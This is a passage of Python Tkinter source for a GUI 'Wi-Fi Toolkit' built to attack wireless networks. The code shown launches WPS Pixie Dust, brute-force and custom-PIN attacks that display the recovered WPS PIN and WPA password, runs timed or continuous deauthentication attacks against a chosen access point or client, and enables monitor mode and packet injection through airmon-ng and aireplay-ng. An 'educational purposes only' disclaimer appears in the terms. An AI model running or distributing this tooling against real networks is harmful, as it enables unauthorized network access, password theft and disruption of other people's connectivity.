        self.output_console.delete(1.0, tk.END)
        self.output_console.configure(state='disabled')

    def copy_to_clipboard(self, text):
        if not text:
            print("[!] Nothing to copy.")
            return
        self.parent.clipboard_clear()
        self.parent.clipboard_append(text)
        print(f"[*] '{text}' copied to clipboard.")

    def refresh_adapters(self):
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, check=True)
            interfaces = re.findall(r'Interface\s+(\w+)', result.stdout)
            self.adapter_combo['values'] = interfaces if interfaces else []
            current_val = self.adapter_var.get()
            # Try to keep the current selection if it's still valid
            if current_val not in interfaces:
                self.adapter_var.set(interfaces[0] if interfaces else "No Wi-Fi adapters found")
        except (FileNotFoundError, subprocess.CalledProcessError):
            self.adapter_combo['values'] = []
            self.adapter_var.set("Could not find 'iw' command")

    def toggle_auto_scan(self):
        self.auto_scan_active = not self.auto_scan_active
        if self.auto_scan_active:
            self.scan_btn.config(text="Stop Auto Scan")
            self.run_scan()
        else:
            if self.auto_scan_job: self.parent.after_cancel(self.auto_scan_job)
            self.auto_scan_job = None
            self.scan_btn.config(text="Start Auto Scan")

    def run_scan(self):
        iface = self.adapter_var.get()
        if not iface or "No" in iface:
            messagebox.showwarning("Scan Error", "Please select a valid network adapter.")
            if self.auto_scan_active: self.toggle_auto_scan()
            return
        threading.Thread(target=self._scan_thread, args=(iface,), daemon=True).start()

    def _scan_thread(self, iface):
        scanner = WiFiScanner(iface, VULNWSC_LIST_CONTENT)
        networks = scanner.iw_scanner()
        self.parent.after(0, self.update_networks_list, networks)
        if self.auto_scan_active:
            self.auto_scan_job = self.parent.after(4000, self.run_scan)

    def update_networks_list(self, networks):
        self.networks_tree.delete(*self.networks_tree.get_children())
        for net in networks:
            device_name = net.get('FullDeviceName', 'N/A')
            is_vulnerable = device_name in self.vuln_list
            tag = 'vulnerable' if is_vulnerable else ''
            values = (net.get('BSSID', 'N/A'), net.get('ESSID', 'N/A'), net.get('Signal', 'N/A'), net.get('Band', 'N/A'), device_name)
            self.networks_tree.insert("", "end", values=values, tags=(tag,))

    def on_network_select(self, event):
        selected_item = self.networks_tree.focus()
        if selected_item:
            bssid = self.networks_tree.item(selected_item)['values'][0]
            self.bssid_var.set(bssid)
            
    def start_attack(self, attack_type):
        if self.auto_scan_active:
            self.toggle_auto_scan()

        iface, bssid, pin = self.adapter_var.get(), self.bssid_var.get(), self.pin_var.get()
        if not iface or "No" in iface: messagebox.showerror("Error", "Please select a valid adapter."); return
        if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid): messagebox.showerror("Error", "Invalid Target BSSID format."); return
        if attack_type == "custom_pin" and not re.match(r'^\d{4,8}$', pin): messagebox.showerror("Error", "Custom PIN must be 4 or 8 digits."); return
        if attack_type == "bruteforce" and pin and not re.match(r'^\d{4,7}$', pin): messagebox.showerror("Error", "Bruteforce start PIN must be 4 to 7 digits."); return

        self.clear_console(); self.pin_result_var.set(""); self.psk_result_var.set("")
        self.stop_attack_event.clear(); self.set_attack_state(True)
        
        pixie = attack_type == "pixie"
        bruteforce = attack_type == "bruteforce"
        if attack_type == 'pixie' and not pin: pin = '12345670'

        self.attack_thread = threading.Thread(target=self._attack_thread, args=(iface, bssid, pin, pixie, bruteforce, self.pixie_force_var.get(), self.save_creds_var.get()), daemon=True)
        self.attack_thread.start()
        self.monitor_attack_thread()

    def _attack_thread(self, iface, bssid, pin, pixie, bruteforce, pixieforce, save_result):
        companion = None
        self.gui_output.redirect()
        nm_stopped = False
        try:
            print("[*] Stopping NetworkManager for WPS attack...")
            try:
                subprocess.run(['systemctl', 'stop', 'NetworkManager'], check=True, capture_output=True, text=True)
                nm_stopped = True
                print("[+] NetworkManager stopped successfully.")
            except Exception as nm_e:
                print(f"[!] Warning: Could not stop NetworkManager: {nm_e.stderr.strip()}")
                print("[i] The attack will proceed, but may be less stable.")

            companion = Companion(iface, self.stop_attack_event, save_result=save_result, print_debug=False)
            companion.attack(bssid, pin=pin, pixie=pixie, bruteforce=bruteforce, pixieforce=pixieforce)
            if companion.connection_status.wpa_psk:
                self.parent.after(0, self.update_cracked_credentials, companion.connection_status)
        except Exception as e:
            print(f"\n[!] Attack thread error: {e}")
        finally:
            if companion:
                companion.cleanup()
            
            if nm_stopped:
                print("\n[*] Restarting NetworkManager...")
                try:
                    subprocess.run(['systemctl', 'start', 'NetworkManager'], check=True, capture_output=True, text=True)
                    print("[+] NetworkManager restarted successfully.")
                except Exception as nm_e:
                    print(f"[!] Error: Could not restart NetworkManager: {nm_e.stderr.strip()}")
                    print("[i] You may need to restart it manually: sudo systemctl start NetworkManager")

            self.stop_attack_event.set()
            self.gui_output.restore()
            
    def monitor_attack_thread(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self.parent.after(100, self.monitor_attack_thread)
        else:
            self.set_attack_state(False)
            print("\n[*] Attack finished or was stopped.")

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            print("\n[!] Sending stop signal... please wait for cleanup.")
            self.stop_attack_event.set()
            self.stop_btn.config(state="disabled")
    
    def set_attack_state(self, is_attacking):
        state = "disabled" if is_attacking else "normal"
        for btn in [self.pixie_btn, self.bruteforce_btn, self.custom_pin_btn, self.scan_btn]: btn.config(state=state)
        self.adapter_combo.config(state=state)
        self.stop_btn.config(state="normal" if is_attacking else "disabled")
        
    def update_cracked_credentials(self, status):
        if status.wps_pin: self.pin_result_var.set(status.wps_pin)
        if status.wpa_psk: self.psk_result_var.set(status.wpa_psk)
        
    def on_closing(self):
        self.gui_output.restore()
        if self.attack_thread and self.attack_thread.is_alive():
            self.stop_attack_event.set()
            self.attack_thread.join(timeout=2)

# --- Global list to track all application instances ---
g_instances = []

# --- Function to create a new application window ---
def create_new_instance():
    """Creates a new Toplevel window and a WifiToolsApp instance to manage it."""
    new_window = tk.Toplevel(root)
    WifiToolsApp(new_window)

# --- Main Application Class ---
class WifiToolsApp:
    instance_counter = 0

    def __init__(self, root_widget):
        WifiToolsApp.instance_counter += 1
        self.instance_id = WifiToolsApp.instance_counter
        
        self.root = root_widget
        self.is_main_window = isinstance(self.root, tk.Tk)
        self.root.title(f"Shahriyar Wi-Fi Toolkit v{APP_VERSION} [{self.instance_id}]")
        
        g_instances.append(self)
        
        if self.is_main_window and not self.is_admin():
            messagebox.showerror("Permission Denied", "This tool requires root/administrator privileges.\nPlease run it with 'sudo'.")
            self.root.destroy()
            return
            
        if self.is_main_window:
            self.root.geometry("1380x768") 
        self.is_fullscreen = False 
        
        self.root.minsize(1280, 720)
        self.root.configure(bg='#2d2d2d')

        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.configure_styles()

        self.adapter_details = {}
        self.target_bssid = tk.StringVar(value="")
        self.target_client_var = tk.StringVar(value="")
        self.adapter_var = tk.StringVar(value="")
        self.adapter_driver_var = tk.StringVar(value="N/A")
        self.adapter_chipset_var = tk.StringVar(value="N/A")
        self.adapter_monitor_var = tk.StringVar(value="N/A")
        self.adapter_injection_var = tk.StringVar(value="N/A")
        self.adapter_ap_mode_var = tk.StringVar(value="N/A")

        self.active_duration = tk.IntVar(value=1)
        self.rest_duration = tk.IntVar(value=1)
        self.continuous_deauth_var = tk.BooleanVar(value=False)
        self.terms_var = tk.BooleanVar(value=True)
        self.is_deauthing = False
        self.is_scanning = False
        self.deauth_thread = None
        self.scan_thread = None
        self.ui_update_queue = queue.Queue()
        self.found_networks, self.found_clients = {}, {}
        self.selected_networks = set()
        self.deauth_process, self.scan_process, self.channel_lock_process = None, None, None
        self.monitor_interface = None
        os.makedirs("csv", exist_ok=True)
        self.scan_file_prefix = os.path.join("csv", f"wifi_scan_output_{self.instance_id}")
        self.channel_match_event = threading.Event()
        
        self.setup_logging()
        self.create_widgets()
        self.configure_resizing()
        self.detect_adapters()
        if not self.check_for_existing_monitor_mode():
            if self.is_main_window: self.try_auto_start_monitor_mode() 
        self.process_ui_updates()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.bind("<FocusIn>", self.handle_focus_in)

    def is_admin(self):
        try:
            return os.geteuid() == 0
        except AttributeError:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
            
    def setup_logging(self):
        os.makedirs("log", exist_ok=True)
        log_file = os.path.join("log", f"wifi_tools_instance_{self.instance_id}.log")
        handler = logging.FileHandler(log_file, mode='w')
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
        handler.setFormatter(formatter)
        
        self.logger = logging.getLogger(f"instance_{self.instance_id}")
        if not self.logger.handlers:
            self.logger.setLevel(logging.INFO)
            self.logger.addHandler(handler)
        self.log_message(f"Logger initialized for instance {self.instance_id}. Log file: {log_file}", "system")

    def configure_styles(self):
        self.dark_bg, self.light_bg = '#2d2d2d', '#3c3c3c'
        self.text_color, self.accent_color, self.accent_dark = '#e0e0e0', '#00aaff', '#0077cc'
        self.monitor_color = '#1A5D1A' 
        self.style.configure(".", background=self.dark_bg, foreground=self.text_color, font=("Helvetica", 10))
        self.style.configure("TFrame", background=self.dark_bg)
        self.style.configure("TLabel", background=self.dark_bg, foreground=self.text_color)
        self.style.configure("Header.TLabel", font=("Verdana", 20, "bold"), foreground=self.accent_color)
        self.style.configure("TButton", font=("Helvetica", 10, "bold"), padding=8, background=self.accent_dark, foreground=self.text_color, borderwidth=1, relief="raised")
        self.style.map("TButton", background=[('active', self.accent_color), ('pressed', self.accent_dark)])
        self.style.configure("TLabelframe", background=self.dark_bg, foreground=self.text_color, bordercolor=self.accent_dark, relief="solid", borderwidth=1)
        self.style.configure("TLabelframe.Label", background=self.dark_bg, foreground=self.text_color, font=("Helvetica", 11, "bold"))
        self.style.configure("TSpinbox", fieldbackground=self.light_bg, foreground=self.text_color, insertcolor=self.text_color, borderwidth=1, selectbackground=self.accent_dark)
        self.style.map('TSpinbox', fieldbackground=[('disabled', '#555555')])
        self.style.configure("TNotebook", background=self.dark_bg, borderwidth=0)
        self.style.configure("TNotebook.Tab", background=self.light_bg, foreground=self.text_color, padding=[10, 5], font=("Helvetica", 11, "bold"))
        self.style.map("TNotebook.Tab", background=[("selected", self.accent_dark)], foreground=[("selected", "white")])
        self.style.configure("Treeview", background=self.light_bg, foreground=self.text_color, fieldbackground=self.light_bg, rowheight=25, borderwidth=1, relief="solid")
        self.style.configure("Treeview.Heading", font=("Helvetica", 10, "bold"), background=self.accent_dark, foreground='white')
        self.style.map("Treeview", background=[('selected', self.accent_color)])
        self.style.configure("TCombobox", fieldbackground=self.light_bg, foreground=self.text_color, selectbackground=self.accent_dark)
        self.style.configure("TEntry", fieldbackground=self.light_bg, foreground=self.text_color, insertcolor=self.text_color)
        self.style.configure("TCheckbutton", background=self.dark_bg, foreground=self.text_color)
        self.style.map('Monitor.TCombobox', fieldbackground=[('readonly', self.monitor_color)], foreground=[('readonly', 'white')], selectbackground=[('readonly', self.accent_dark)])

    def create_widgets(self):
        self.main_frame = ttk.Frame(self.root, padding="15")
        self.main_frame.grid(row=0, column=0, sticky="nsew")
        
        header_frame = ttk.Frame(self.main_frame); header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 15))
        header_frame.columnconfigure(1, weight=1)
        header_left = ttk.Frame(header_frame); header_left.grid(row=0, column=0, sticky="w")
        ttk.Label(header_left, text="Shahriyar Wi-Fi Toolkit", style="Header.TLabel").pack(anchor="w")
        ttk.Label(header_left, text=f"v{APP_VERSION} - Comprehensive Network Security Tool", font=("Verdana", 12, "italic")).pack(anchor="w")
        
        header_right = ttk.Frame(header_frame); header_right.grid(row=0, column=2, sticky="e")
        ttk.Button(header_right, text="About", command=self.show_about_window).pack(side="left", padx=(0, 10))
        ttk.Button(header_right, text="New Instance", command=create_new_instance).pack(side="left", padx=(0, 10))
        ttk.Button(header_right, text="Fullscreen", command=self.toggle_fullscreen).pack(side="left")

        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.grid(row=1, column=0, sticky="nsew")

        self.create_scanner_tab()
        self.create_deauth_tab()
        self.create_oneshot_tab()
    
    def create_scanner_tab(self):
        self.scanner_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.scanner_frame, text="   Network Scanner   ")
        self.scanner_frame.rowconfigure(1, weight=2); self.scanner_frame.rowconfigure(2, weight=1) 
        self.scanner_frame.columnconfigure(0, weight=1)

        top_controls = ttk.Frame(self.scanner_frame); top_controls.grid(row=0, column=0, sticky="ew", pady=5)
        top_controls.columnconfigure(1, weight=1)
        adapter_frame = ttk.Frame(top_controls); adapter_frame.grid(row=0, column=0, sticky="w", padx=(0, 10))
        ttk.Label(adapter_frame, text="Adapter:").pack(side="left", padx=(0, 5))
        self.scan_adapter_combo = ttk.Combobox(adapter_frame, textvariable=self.adapter_var, state="readonly", width=15)
        self.scan_adapter_combo.pack(side="left", padx=5)
        self.scan_adapter_combo.bind('<<ComboboxSelected>>', self.on_adapter_select)
        ttk.Button(adapter_frame, text="Refresh", command=self.detect_adapters).pack(side="left", padx=5)
        ttk.Button(adapter_frame, text="Show Details", command=self.show_adapter_details_window).pack(side="left", padx=5)

        monitor_frame = ttk.Frame(top_controls); monitor_frame.grid(row=0, column=2, sticky="e")
        self.monitor_button = ttk.Button(monitor_frame, text="Start Monitor Mode", command=self.start_monitor_mode, width=20)
        self.monitor_button.pack(side="left", padx=10)
        self.stop_monitor_button = ttk.Button(monitor_frame, text="Stop Monitor Mode", command=self.stop_monitor_mode, width=20, state="disabled")
        self.stop_monitor_button.pack(side="left", padx=5)
        self.monitor_status_label = ttk.Label(monitor_frame, text="Monitor Mode: INACTIVE", foreground="red", font=("Helvetica", 12, "bold"))
        self.monitor_status_label.pack(side="left", padx=10)

        ap_frame = ttk.LabelFrame(self.scanner_frame, text=" Access Points (APs) ", padding="10")
        ap_frame.grid(row=1, column=0, sticky="nsew", pady=(10, 5))
        ap_frame.rowconfigure(1, weight=1); ap_frame.columnconfigure(0, weight=1)
        
        scan_controls = ttk.Frame(ap_frame); scan_controls.grid(row=0, column=0, sticky="ew", pady=5)
        self.scan_button = ttk.Button(scan_controls, text="Start Scan", command=self.start_network_scan, width=15)
        self.scan_button.pack(side="left", padx=(0, 10))
        self.stop_scan_button = ttk.Button(scan_controls, text="Stop Scan", command=self.stop_network_scan, width=15, state="disabled")
        self.stop_scan_button.pack(side="left", padx=5)
        ttk.Button(scan_controls, text="Copy BSSID", command=self.copy_bssid, width=15).pack(side="left", padx=5)
        ttk.Button(scan_controls, text="Show Clients for Selected", command=self.show_clients_for_selected, width=25).pack(side="left", padx=5)

        ap_tree_frame = ttk.Frame(ap_frame); ap_tree_frame.grid(row=1, column=0, sticky="nsew", pady=10)
        ap_tree_frame.rowconfigure(0, weight=1); ap_tree_frame.columnconfigure(0, weight=1)
        columns = ('select', 'bssid', 'pwr', 'ch', 'band', 'security', 'essid')
        self.network_tree = ttk.Treeview(ap_tree_frame, columns=columns, show='headings')
        self.network_tree.heading('select', text='Select'); self.network_tree.column('select', width=60, anchor='center', stretch=False)
        self.network_tree.heading('bssid', text='BSSID'); self.network_tree.column('bssid', width=160)
        self.network_tree.heading('pwr', text='PWR'); self.network_tree.column('pwr', width=60, anchor='center')
        self.network_tree.heading('ch', text='CH'); self.network_tree.column('ch', width=50, anchor='center')
        self.network_tree.heading('band', text='Band'); self.network_tree.column('band', width=80, anchor='center')
        self.network_tree.heading('security', text='Security'); self.network_tree.column('security', width=120)
        self.network_tree.heading('essid', text='ESSID'); self.network_tree.column('essid', width=250)
        self.network_tree.grid(row=0, column=0, sticky="nsew")
        ap_scrollbar = ttk.Scrollbar(ap_tree_frame, orient="vertical", command=self.network_tree.yview)
        self.network_tree.configure(yscrollcommand=ap_scrollbar.set); ap_scrollbar.grid(row=0, column=1, sticky="ns")
        self.network_tree.bind('<Button-1>', self.on_tree_click); self.network_tree.bind('<Double-1>', self.start_deauth_from_scan)

        client_frame = ttk.LabelFrame(self.scanner_frame, text=" Connected Clients ", padding="10")
        client_frame.grid(row=2, column=0, sticky="nsew", pady=(5, 0))
        client_frame.rowconfigure(0, weight=1); client_frame.columnconfigure(0, weight=1)
        client_tree_frame = ttk.Frame(client_frame); client_tree_frame.grid(row=0, column=0, sticky="nsew", pady=5)
        client_tree_frame.rowconfigure(0, weight=1); client_tree_frame.columnconfigure(0, weight=1)
        client_columns = ('station', 'pwr', 'bssid')
        self.client_tree = ttk.Treeview(client_tree_frame, columns=client_columns, show='headings')
        self.client_tree.heading('station', text='Client MAC (STATION)'); self.client_tree.column('station', width=160)
        self.client_tree.heading('pwr', text='PWR'); self.client_tree.column('pwr', width=60, anchor='center')
        self.client_tree.heading('bssid', text='Connected AP (BSSID)'); self.client_tree.column('bssid', width=160)
        self.client_tree.grid(row=0, column=0, sticky="nsew")
        client_scrollbar = ttk.Scrollbar(client_tree_frame, orient="vertical", command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=client_scrollbar.set); client_scrollbar.grid(row=0, column=1, sticky="ns")
        self.client_tree.bind('<<TreeviewSelect>>', self.on_client_select)

    def create_deauth_tab(self):
        self.deauth_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.deauth_frame, text="   Deauth Attack   ")
        self.deauth_frame.rowconfigure(0, weight=1); self.deauth_frame.columnconfigure(1, weight=1)
        
        left_pane = ttk.Frame(self.deauth_frame, padding="10"); left_pane.grid(row=0, column=0, sticky="ns")
        controls_frame = ttk.LabelFrame(left_pane, text=" Configuration ", padding="10")
        controls_frame.grid(row=0, column=0, sticky="ew"); controls_frame.columnconfigure(1, weight=1)
        ttk.Label(controls_frame, text="Monitor Adapter:").grid(row=0, column=0, padx=5, pady=8, sticky="w")
        self.adapter_combo = ttk.Combobox(controls_frame, textvariable=self.adapter_var, state="readonly")
        self.adapter_combo.grid(row=0, column=1, padx=5, pady=8, sticky="ew")
        ttk.Label(controls_frame, text="Target AP (BSSID):").grid(row=1, column=0, padx=5, pady=8, sticky="w")
        ttk.Entry(controls_frame, textvariable=self.target_bssid).grid(row=1, column=1, padx=5, pady=8, sticky="ew")
        ttk.Label(controls_frame, text="Target Client (Optional):").grid(row=2, column=0, padx=5, pady=8, sticky="w")
        ttk.Entry(controls_frame, textvariable=self.target_client_var).grid(row=2, column=1, padx=5, pady=8, sticky="ew")
        ttk.Label(controls_frame, text="Active Time (mins):").grid(row=3, column=0, padx=5, pady=8, sticky="w")
        self.active_spinbox = ttk.Spinbox(controls_frame, from_=1, to=120, textvariable=self.active_duration, width=10)
        self.active_spinbox.grid(row=3, column=1, padx=5, pady=8, sticky="w")
        ttk.Label(controls_frame, text="Rest Time (mins):").grid(row=4, column=0, padx=5, pady=8, sticky="w")
        self.rest_spinbox = ttk.Spinbox(controls_frame, from_=1, to=120, textvariable=self.rest_duration, width=10)
        self.rest_spinbox.grid(row=4, column=1, padx=5, pady=8, sticky="w")
        ttk.Checkbutton(controls_frame, text="Continuous Deauth", variable=self.continuous_deauth_var, command=self.toggle_duration_controls).grid(row=5, column=0, columnspan=2, padx=5, pady=8, sticky="w")
        ttk.Checkbutton(controls_frame, text="I understand this is for educational purposes only.", variable=self.terms_var).grid(row=6, column=0, columnspan=2, padx=5, pady=8, sticky="w")

        action_frame = ttk.Frame(left_pane); action_frame.grid(row=1, column=0, pady=20)
        self.start_deauth_button = ttk.Button(action_frame, text="Start Deauth Attack", command=self.start_deauth_attack)
        self.start_deauth_button.pack(side="left", padx=5)
        self.stop_button = ttk.Button(action_frame, text="Stop Deauth", command=self.stop_deauth_attack, state="disabled")
        self.stop_button.pack(side="left", padx=5)

        status_frame = ttk.LabelFrame(left_pane, text=" Live Status ", padding="10")
        status_frame.grid(row=2, column=0, sticky="ew"); status_frame.columnconfigure(1, weight=1)
        self.status_labels = { "Current Phase": ttk.Label(status_frame, text="IDLE"), "Time Remaining": ttk.Label(status_frame, text="N/A") }
        ttk.Label(status_frame, text="Current Phase:").grid(row=0, column=0, sticky="w"); self.status_labels["Current Phase"].grid(row=0, column=1, sticky="w")
        ttk.Label(status_frame, text="Time Remaining:").grid(row=1, column=0, sticky="w"); self.status_labels["Time Remaining"].grid(row=1, column=1, sticky="w")
        self.progress_bar = ttk.Progressbar(status_frame, orient='horizontal', mode='determinate')
        self.progress_bar.grid(row=2, column=0, columnspan=2, sticky="ew", pady=10)
        
        right_pane = ttk.Frame(self.deauth_frame); right_pane.grid(row=0, column=1, sticky="nsew")
        right_pane.rowconfigure(0, weight=1); right_pane.columnconfigure(0, weight=1)
        log_frame = ttk.LabelFrame(right_pane, text=" Process Log ", padding="10")
        log_frame.grid(row=0, column=0, sticky="nsew", pady=(0,5))
        log_frame.rowconfigure(0, weight=1); log_frame.columnconfigure(0, weight=1)
        self.log_area = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, bg=self.light_bg, fg=self.text_color, state="disabled", font=("Courier New", 9))
        self.log_area.grid(row=0, column=0, sticky="nsew")
        ttk.Button(log_frame, text="Clear On-screen Log", command=self.clear_log).grid(row=1, column=0, pady=5)
    
    def create_oneshot_tab(self):
        self.oneshot_frame = ttk.Frame(self.notebook, padding="0")
        self.notebook.add(self.oneshot_frame, text="   Oneshot WPS Attack   ")
        self.oneshot_instance = OneshotTab(self.oneshot_frame, self.style, self)

    def _open_link(self, event):
        webbrowser.open_new_tab("https://github.com/shahriyarsojibhasan")

    def show_about_window(self):
        about_win = tk.Toplevel(self.root); about_win.title(f"About Wi-Fi Tools v{APP_VERSION}")
        about_win.configure(bg=self.dark_bg); about_win.transient(self.root); about_win.grab_set(); about_win.resizable(False, False)
        main_frame = ttk.Frame(about_win, padding="25"); main_frame.pack(expand=True, fill="both")
        ttk.Label(main_frame, text=f"Shahriyar Wi-Fi Toolkit v{APP_VERSION}", style="Header.TLabel", anchor="center").pack(pady=(0, 15))
        ttk.Label(main_frame, text="Developer: Shahriyar Sojib Hasan", font=("Verdana", 14, "bold"), anchor="center").pack(pady=10)
        link_frame = ttk.Frame(main_frame, style="TLabelframe", padding=5); link_frame.pack(pady=10)
        link_font = tkFont.Font(family="Helvetica", size=11, underline=True)
        link_label = ttk.Label(link_frame, text="https://github.com/shahriyarsojibhasan", foreground=self.accent_color, font=link_font, cursor="hand2")
        link_label.pack(padx=10, pady=5); link_label.bind("<Button-1>", self._open_link)
        ttk.Label(main_frame, text="Terms of Use", font=("Helvetica", 12, "bold")).pack(pady=(20, 5))
        terms_text_widget = scrolledtext.ScrolledText(main_frame, wrap=tk.WORD, width=80, height=12, bg=self.light_bg, fg=self.text_color, relief="solid", borderwidth=1)
        terms_content = """1. Educational Purpose Only: This software is provided strictly for educational and security research purposes in a controlled and authorized environment.
2. No Malicious Use: You are expressly forbidden from using this software for any malicious activities, including but not limited to attacking, disrupting, or gaining unauthorized access to any network or system for which you do not have explicit, written permission from the owner.
3. Legal Compliance: You are solely responsible for your actions and must comply with all applicable local, state, national, and international laws regarding cybersecurity and network interference. The use of this tool may be illegal in your jurisdiction without proper authorization.
4. No Warranty: This software is provided "as is" without any warranty of any kind, either expressed or implied. The developer does not guarantee that the software will be error-free or that it will meet your specific requirements.
5. Limitation of Liability: The developer, Shahriyar Sojib Hasan, assumes no liability and shall not be held responsible for any damages arising from the use or misuse of this software. By using this tool, you agree to indemnify the developer from any and all claims of liability."""
        terms_text_widget.insert(tk.END, terms_content.strip()); terms_text_widget.configure(state="disabled")
        terms_text_widget.pack(pady=5, expand=True, fill="both")
        ttk.Button(main_frame, text="Close", command=about_win.destroy).pack(pady=(20, 0))
        about_win.update_idletasks()
        x = self.root.winfo_x() + (self.root.winfo_width() - about_win.winfo_width()) // 2
        y = self.root.winfo_y() + (self.root.winfo_height() - about_win.winfo_height()) // 2
        about_win.geometry(f"+{x}+{y}")
        
    def show_adapter_details_window(self):
        adapter_name = self.adapter_var.get()
        if not adapter_name:
            messagebox.showinfo("No Adapter Selected", "Please select an adapter from the list first.")
            return

        details_win = tk.Toplevel(self.root); details_win.title(f"Details for {adapter_name}"); details_win.configure(bg=self.dark_bg)
        details_win.transient(self.root); details_win.grab_set(); details_win.resizable(False, False)
        main_frame = ttk.Frame(details_win, padding="20"); main_frame.pack(expand=True, fill="both")
        details = {"Driver": self.adapter_driver_var.get(), "Chipset": self.adapter_chipset_var.get(), "Monitor Mode": self.adapter_monitor_var.get(), "Packet Injection": self.adapter_injection_var.get(), "AP Mode": self.adapter_ap_mode_var.get()}
        for i, (key, value) in enumerate(details.items()):
            ttk.Label(main_frame, text=f"{key}:", font=("Helvetica", 10, "bold")).grid(row=i, column=0, sticky="w", pady=2)
            ttk.Label(main_frame, text=value, wraplength=300, justify=tk.LEFT).grid(row=i, column=1, sticky="w", pady=2, padx=5)
        ttk.Button(main_frame, text="Close", command=details_win.destroy).grid(row=len(details), column=0, columnspan=2, pady=(15, 0))
        details_win.update_idletasks()
        x = self.root.winfo_x() + (self.root.winfo_width() - details_win.winfo_width()) // 2
        y = self.root.winfo_y() + (self.root.winfo_height() - details_win.winfo_height()) // 2
        details_win.geometry(f"+{x}+{y}")
        
    def handle_focus_in(self, event=None):
        if event and event.widget == self.root: self.root.update_idletasks()

    def toggle_fullscreen(self, event=None):
        self.is_fullscreen = not self.is_fullscreen
        self.root.attributes('-fullscreen', self.is_fullscreen)
        
    def toggle_duration_controls(self):
        state = "disabled" if self.continuous_deauth_var.get() else "normal"
        self.active_spinbox.config(state=state); self.rest_spinbox.config(state=state)
        self.status_labels["Time Remaining"].config(text="N/A"); self.progress_bar['value'] = 0

    def check_for_existing_monitor_mode(self):
        self.log_message("Checking for existing monitor mode interfaces...", "info")
        try:
            result = subprocess.run(['iwconfig'], check=True, capture_output=True, text=True)
            monitor_interface = next((line.split()[0] for line in result.stdout.split('\n') if 'Mode:Monitor' in line), None)
            if monitor_interface:
                self.monitor_interface = monitor_interface; self.adapter_var.set(monitor_interface) 
                self.log_message(f"Found existing monitor mode on '{monitor_interface}'.", "success")
                self.ui_update_queue.put(("monitor_mode_status", ("ACTIVE", monitor_interface)))
                return True
        except Exception as e:
            self.log_message(f"Could not check for existing monitor mode: {e}", "warning")
        return False

    def detect_adapters(self):
        self.log_message("Detecting wireless adapters and chipsets...", "info")
        self.adapter_details = {} 
        try:
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True, check=True)
            lines, adapters = result.stdout.strip().split('\n'), []
            if len(lines) > 1:
                for line in lines[1:]:
                    parts = re.split(r'\s+', line.strip())
                    if len(parts) >= 4:
                        interface, driver, chipset = parts[1], parts[2], " ".join(parts[3:])
                        original_iface = re.match(r'(\w+?)mon', interface).group(1) if re.match(r'(\w+?)mon', interface) else interface
                        self.adapter_details[interface] = {'driver': driver, 'chipset': chipset, 'original_iface': original_iface}
                        adapters.append(interface)

            if adapters:
                self.scan_adapter_combo['values'] = adapters; self.adapter_combo['values'] = adapters
                if not self.adapter_var.get() or self.adapter_var.get() not in adapters: self.adapter_var.set(adapters[0])
                self.log_message(f"Found {len(adapters)} adapter(s).", "success"); self.on_adapter_select(None)
            else:
                self.log_message("No wireless adapters detected by airmon-ng.", "error")
                self.scan_adapter_combo['values'] = []; self.adapter_combo['values'] = []
                self.adapter_var.set(""); self.on_adapter_select(None)
        except Exception as e:
            self.log_message(f"Error detecting adapters via airmon-ng: {e}. Please check permissions.", "error")
            self.scan_adapter_combo['values'] = []; self.adapter_combo['values'] = []
            self.adapter_var.set(""); self.on_adapter_select(None)
            
    def on_adapter_select(self, event):
        adapter_name = self.adapter_var.get()
        is_monitor = 'mon' in adapter_name or (self.monitor_interface and adapter_name == self.monitor_interface)
        style = 'Monitor.TCombobox' if is_monitor else 'TCombobox'
        self.scan_adapter_combo.config(style=style); self.adapter_combo.config(style=style)

        if not adapter_name:
            self.adapter_driver_var.set("N/A"); self.adapter_chipset_var.set("N/A"); self.adapter_monitor_var.set("N/A")
            self.adapter_injection_var.set("N/A"); self.adapter_ap_mode_var.set("N/A"); return

        details = self.adapter_details.get(adapter_name, {})
        self.adapter_driver_var.set(details.get('driver', 'Unknown')); self.adapter_chipset_var.set(details.get('chipset', 'Unknown'))
        
        self.adapter_ap_mode_var.set("Checking...")
        original_iface = details.get('original_iface', adapter_name)
        threading.Thread(target=self._check_ap_support, args=(original_iface,), daemon=True).start()

        if is_monitor:
            self.adapter_monitor_var.set("Active"); self.adapter_injection_var.set("Testing...")
            threading.Thread(target=self._test_injection, args=(adapter_name,), daemon=True).start()
        else:
            self.adapter_monitor_var.set("Supported (Inactive)"); self.adapter_injection_var.set("Enable Monitor Mode to test")

    def _get_phy_name(self, interface_name):
        try:
            result = subprocess.run(['iw', 'dev', interface_name, 'info'], capture_output=True, text=True, check=True)
            if match := re.search(r'phy#(\d+)', result.stdout): return f'phy{match.group(1)}'
        except (subprocess.CalledProcessError, FileNotFoundError):
             try:
                result = subprocess.run(['ls', f'/sys/class/net/{interface_name}/phy80211/name'], capture_output=True, text=True, check=True)
                return result.stdout.strip()
             except Exception: return None
        return None

    def _check_ap_support(self, interface_name):
        self.log_message(f"Checking AP mode support for {interface_name}...", "system")
        phy_name = self._get_phy_name(interface_name)
        if not phy_name: self.ui_update_queue.put(("ap_mode_test_result", "Unknown (No Phy)")); return
        
        result_text = "Not Supported"
        try:
            proc = subprocess.run(['iw', phy_name, 'info'], capture_output=True, text=True, timeout=10)
            if "Supported interface modes:" in proc.stdout and "* AP" in proc.stdout: result_text = "Supported"
        except Exception as e:
            result_text = "Test Error"; self.log_message(f"Error during AP mode check for {interface_name}: {e}", "error")
        self.ui_update_queue.put(("ap_mode_test_result", result_text))
    
    def _test_injection(self, interface_name):
        self.log_message(f"Starting packet injection test for {interface_name}...", "system")
        result_text = "Not Supported"
        try:
            proc = subprocess.run(['aireplay-ng', '--test', interface_name], capture_output=True, text=True, timeout=20)
